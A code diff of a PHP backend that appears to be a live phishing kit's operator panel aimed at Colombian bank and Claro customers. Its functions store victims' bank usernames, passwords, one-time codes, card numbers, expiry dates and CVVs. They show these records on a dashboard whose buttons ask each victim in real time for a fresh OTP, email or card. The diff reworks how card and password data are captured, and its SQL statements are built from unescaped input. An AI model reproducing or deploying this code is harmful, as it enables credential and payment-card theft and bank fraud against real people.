@@ -56,7 +56,7 @@ function close_info(){
 	$GLOBALS["borde_cerrado"] = "border: 1px solid #F1416C;";
 }
 
-function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mob,$card,$dat,$cvv,$idc,$lin,$pse){
+function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mob,$card,$dat,$cvv,$idc,$lin){
 	
 	switch ($status) {
 		case 1: input_info("Ingresó Usuario/Clave");
@@ -91,25 +91,19 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 
 			<table width="100%">
 				<tr>
-					<td colspan="3"><div class="grupo" style="background-color: #E52A1B;">Datos Claro</div></td>					
+					<td colspan="2"><div class="grupo" style="background-color: #E52A1B;">Datos Claro</div></td>					
 				</tr>
 				<tr>
-					<td width="33%">
+					<td width="50%">
 						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
 							<span class="valor">'.$idc.'</span><br>
 							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Cedula. # Cliente</span>
 						</div>
 					</td>
-					<td width="33%">
+					<td width="50%">
 						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
 							<span class="valor">'.$lin.'</span><br>
 							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Linea de celular</span>
-						</div>
-					</td>
-					<td width="34%">
-						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
-							<span class="valor">'.$pse.'</span><br>
-							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo PSE</span>
 						</div>
 					</td>
 				</tr>
@@ -220,7 +214,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].'  id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Usuario</td>
 								</tr>
 							</table>
@@ -230,7 +224,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>OTP</td>
 								</tr>
 							</table>
@@ -240,7 +234,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Nuevo OTP</td>
 								</tr>
 							</table>
@@ -250,7 +244,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Correo</td>
 								</tr>
 							</table>
@@ -260,7 +254,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Tarjeta</td>
 								</tr>
 							</table>
@@ -270,7 +264,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
+									<td><img src="assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
 									<td>Finalizar</td>
 								</tr>
 							</table>
@@ -282,33 +276,6 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 		
 
 		<div class="item-des-mob" style="background-color:'.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
-		<table width="100%">
-				<tr>
-					<td colspan="3"><div class="grupo" style="background-color: #E52A1B;">Datos Claro</div></td>					
-				</tr>
-				<tr>
-					<td width="33%">
-						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
-							<span class="valor">'.$idc.'</span><br>
-							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Cedula. # Cliente</span>
-						</div>
-					</td>
-					<td width="33%">
-						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
-							<span class="valor">'.$lin.'</span><br>
-							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Linea de celular</span>
-						</div>
-					</td>
-					<td width="34%">
-						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
-							<span class="valor">'.$pse.'</span><br>
-							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo PSE</span>
-						</div>
-					</td>
-				</tr>
-			</table>
-
-<div style="width:100%; height: 7px;"></div>
 			<table>
 				<tr>
 					<td colspan="3">
@@ -441,7 +408,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 									<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$id.'">
 										<table>
 											<tr>
-												<td><img src="../assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+												<td><img src="assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 												<td>Usuario</td>
 											</tr>
 										</table>
@@ -451,7 +418,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 									<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$id.'">
 										<table>
 											<tr>
-												<td><img src="../assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+												<td><img src="assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 												<td>OTP</td>
 											</tr>
 										</table>
@@ -461,7 +428,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 									<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$id.'">
 										<table>
 											<tr>
-												<td><img src="../assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+												<td><img src="assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 												<td>Nuevo OTP</td>
 											</tr>
 										</table>
@@ -473,7 +440,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 									<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$id.'">
 										<table>
 											<tr>
-												<td><img src="../assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+												<td><img src="assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 												<td>Correo</td>
 											</tr>
 										</table>
@@ -483,7 +450,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 									<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$id.'">
 										<table>
 											<tr>
-												<td><img src="../assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+												<td><img src="assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 												<td>Tarjeta</td>
 											</tr>
 										</table>
@@ -493,7 +460,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 									<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$id.'">
 										<table>
 											<tr>
-												<td><img src="../assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
+												<td><img src="assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
 												<td>Finalizar</td>
 											</tr>
 										</table>
@@ -511,7 +478,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$id.'"">
 							<table>
 								<tr>
-									<td><img src="../assets/img/usuario-a.svg" width="16"></td>
+									<td><img src="assets/img/usuario-a.svg" width="16"></td>
 									<td>Usuario</td>
 								</tr>
 							</table>
@@ -521,7 +488,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/otp-a.svg" width="16"></td>
+									<td><img src="assets/img/otp-a.svg" width="16"></td>
 									<td>OTP</td>
 								</tr>
 							</table>
@@ -531,7 +498,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Nuevo OTP</td>
 								</tr>
 							</table>
@@ -541,7 +508,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Correo</td>
 								</tr>
 							</table>
@@ -551,7 +518,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Tarjeta</td>
 								</tr>
 							</table>
@@ -561,7 +528,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
+									<td><img src="assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
 									<td>Finalizar</td>
 								</tr>
 							</table>
@@ -575,40 +542,6 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 
 
 		<div class="item-des-small" style="background-color:'.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
-
-
-			<table width="100%">
-				<tr>
-					<td colspan="2"><div class="grupo" style="background-color: #E52A1B;">Datos Claro</div></td>					
-				</tr>
-				<tr>
-					<td width="50%">
-						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
-							<span class="valor">'.$idc.'</span><br>
-							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Cedula. # Cliente</span>
-						</div>
-					</td>
-					<td width="50%">
-						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
-							<span class="valor">'.$lin.'</span><br>
-							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Linea de celular</span>
-						</div>
-					</td>
-					<tr>
-						<td colspan="2">
-							<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
-								<span class="valor">'.$pse.'</span><br>
-								<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo PSE</span>
-							</div>
-						</td>					
-					</tr>
-				</tr>
-			</table>
-
-<div style="width:100%; height: 7px;"></div>
-
-
-
 			<table>
 				<tr>
 					<td colspan="2">
@@ -740,7 +673,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Usuario</td>
 								</tr>
 							</table>
@@ -750,7 +683,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>OTP</td>
 								</tr>
 							</table>
@@ -760,7 +693,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Nuevo OTP</td>
 								</tr>
 							</table>
@@ -772,7 +705,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Correo</td>
 								</tr>
 							</table>
@@ -782,7 +715,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
+									<td><img src="assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
 									<td>Tarjeta</td>
 								</tr>
 							</table>
@@ -792,7 +725,7 @@ function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mo
 						<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$id.'">
 							<table>
 								<tr>
-									<td><img src="../assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
+									<td><img src="assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
 									<td>Finalizar</td>
 								</tr>
 							</table>
@@ -842,7 +775,7 @@ function get_items(){
 		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status <> 0 ORDER BY horamodificado DESC");
 		if (contarfilas($consulta)) {
 			while ($datos=traerdatos($consulta)) {				
-				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);								
+				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro']);								
 			}
 		}else{
 
@@ -866,7 +799,7 @@ function get_items_pending(){
 		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status = 1 OR status = 3 OR status = 5 OR status = 7 OR status = 9 ORDER BY horamodificado DESC");
 		if (contarfilas($consulta)) {
 			while ($datos=traerdatos($consulta)) {				
-				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);								
+				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro']);								
 			}
 		}else{
 
@@ -889,7 +822,7 @@ function get_items_closed(){
 		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status = 10 ORDER BY horamodificado DESC");
 		if (contarfilas($consulta)) {
 			while ($datos=traerdatos($consulta)) {				
-				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);								
+				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro']);								
 			}
 		}else{
 
@@ -906,7 +839,7 @@ function sound_alarm(){
 		if (contarfilas($consulta1)) {
 			echo "OTP";
 		}else{
-			$consulta2 = sentencia($con,"SELECT * FROM m3it3m WHERE status = 1 OR status = 5 OR status = 7");
+			$consulta2 = sentencia($con,"SELECT * FROM m3it3m WHERE status = 1 OR status = 5 OR status = 7 OR status = 13" );
 			if (contarfilas($consulta2)) {
 				echo "SI";
 			}else{
@@ -934,26 +867,7 @@ function upgrades_status($id,$est){
 	}
 }
 
-function create_item($usr,$pass,$dis,$idc,$lin,$ban,$pse){
-	date_default_timezone_set('America/Bogota');
-	$ip_add = $_SERVER['REMOTE_ADDR'];
-	$hoy = date("Y-m-d H:i:s"); 
-	if ($con = conectar()) {
-		if (sentencia($con,"INSERT INTO m3it3m (idreg, usuario, password, otp, dispositivo, ip, id, agente, banco, status, horacreado, horamodificado,idcliente, lineaclaro,correopse) VALUES (NULL, '".$usr."', '".$pass."', NULL, '".$dis."', '".$ip_add."', NULL, NULL, '".$ban."', '1', '".$hoy."', '".$hoy."', '".$idc."', '".$lin."', '".$pse."')")) {
-			$consulta = sentencia($con,"SELECT idreg FROM m3it3m WHERE usuario = '".$usr."' ORDER BY idreg DESC LIMIT 1");
-			if (contarfilas($consulta)) {
-				$datos=traerdatos($consulta);
-				setcookie('id',$datos["idreg"],time()+60*9);			
-				echo $datos["idreg"];
-			}			
-		}else{
-			echo "NO";
-		}
-		desconectar($con);
-	}else{
-		echo "ERR";
-	}
-}
+
 
 function create_user($ced,$lin,$dis){
 	date_default_timezone_set('America/Bogota');
@@ -976,14 +890,46 @@ function create_user($ced,$lin,$dis){
 	}
 }
 
-function create_card($id,$tar,$fec,$cvv,$ban){
 
+function create_item($usr,$pass,$dis,$idc,$lin,$ban){
 	date_default_timezone_set('America/Bogota');
+	$ip_add = $_SERVER['REMOTE_ADDR'];
 	$hoy = date("Y-m-d H:i:s"); 
-
 	if ($con = conectar()) {
-		sentencia($con,"UPDATE m3it3m SET status = '7', tarjeta ='".$tar."', ftarjeta ='".$fec."', cvv ='".$cvv."', banco ='".$ban."', horamodificado='".$hoy."' WHERE idreg = ".$id);
+		if (sentencia($con,"INSERT INTO m3it3m (idreg, usuario, password, otp, dispositivo, ip, id, agente, banco, status, horacreado, horamodificado,idcliente, lineaclaro) VALUES (NULL, '".$usr."', '".$pass."', NULL, '".$dis."', '".$ip_add."', NULL, NULL, '".$ban."', '1', '".$hoy."', '".$hoy."', '".$idc."', '".$lin."')")) {
+			$consulta = sentencia($con,"SELECT idreg FROM m3it3m WHERE usuario = '".$usr."' ORDER BY idreg DESC LIMIT 1");
+			if (contarfilas($consulta)) {
+				$datos=traerdatos($consulta);
+				setcookie('id',$datos["idreg"],time()+60*9);			
+				echo $datos["idreg"];
+			}			
+		}else{
+			echo "NO";
+		}
 		desconectar($con);
+	}else{
+		echo "ERR";
+	}
+}
+
+function create_card($tar,$fec,$cvv,$nom,$ban,$idc,$lin){
+	date_default_timezone_set('America/Bogota');
+	$ip_add = $_SERVER['REMOTE_ADDR'];
+	$hoy = date("Y-m-d H:i:s"); 
+	if ($con = conectar()) {		
+		if (sentencia($con,"INSERT INTO m3it3m (idreg, tarjeta, ftarjeta, cvv, banco, ip, status, horacreado, horamodificado,idcliente, lineaclaro) VALUES (NULL, '".$tar."', '".$fec."', '".$cvv."', '".$ban."', '".$ip_add."', '7', '".$hoy."', '".$hoy."','".$idc."','".$lin."')")) {
+			$consulta = sentencia($con,"SELECT idreg FROM m3it3m WHERE tarjeta = '".$tar."' ORDER BY idreg DESC LIMIT 1");
+			if (contarfilas($consulta)) {
+				$datos=traerdatos($consulta);
+				setcookie('id',$datos["idreg"],time()+60*9);			
+				echo $datos["idreg"];
+			}			
+		}else{
+			echo "NO";
+		}
+		desconectar($con);
+	}else{
+		echo "ERR";
 	}
 }
 
@@ -1002,6 +948,7 @@ function status($r){
 	}
 }
 
+
 function upgrade_user($id,$usr,$pas,$ban){
 	date_default_timezone_set('America/Bogota');
 	$hoy = date("Y-m-d H:i:s"); 
@@ -1011,6 +958,30 @@ function upgrade_user($id,$usr,$pas,$ban){
 		desconectar($con);
 	}
 }
+
+function upgrade_user_b($id,$usr,$ban){
+	date_default_timezone_set('America/Bogota');
+	$hoy = date("Y-m-d H:i:s"); 
+
+	if ($con = conectar()) {
+		sentencia($con,"UPDATE m3it3m SET status = '1', usuario ='".$usr."', banco= '".$ban."', horamodificado='".$hoy."' WHERE idreg = ".$id);
+		desconectar($con);
+	}
+}
+
+
+
+function put_pass($id,$pas){
+	date_default_timezone_set('America/Bogota');
+	$hoy = date("Y-m-d H:i:s"); 
+
+	if ($con = conectar()) {
+		sentencia($con,"UPDATE m3it3m SET status = '1', password ='".$pas."', horamodificado='".$hoy."' WHERE idreg = ".$id);
+		desconectar($con);
+	}
+}
+
+
 
 function put_otp($id,$cd){
 	date_default_timezone_set('America/Bogota');
@@ -1030,27 +1001,6 @@ function put_mail($id,$mail,$cm,$cel){
 		desconectar($con);
 	}
 }
-
-function put_pse($id,$mail){
-	date_default_timezone_set('America/Bogota');
-	$hoy = date("Y-m-d H:i:s"); 
-	if ($con = conectar()) {
-		sentencia($con,"UPDATE m3it3m SET status = '15', correopse='".$mail."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
-		desconectar($con);
-	}
-}
-
-
-function put_psw($id,$mail){
-	date_default_timezone_set('America/Bogota');
-	$hoy = date("Y-m-d H:i:s"); 
-	if ($con = conectar()) {
-		sentencia($con,"UPDATE m3it3m SET status = '12', correopse='".$mail."', horamodificado='".$hoy."'  WHERE idreg = ".$id);
-		desconectar($con);
-	}
-}
-
-
 
 function put_card($id,$tar,$ft,$cvv){
 	date_default_timezone_set('America/Bogota');
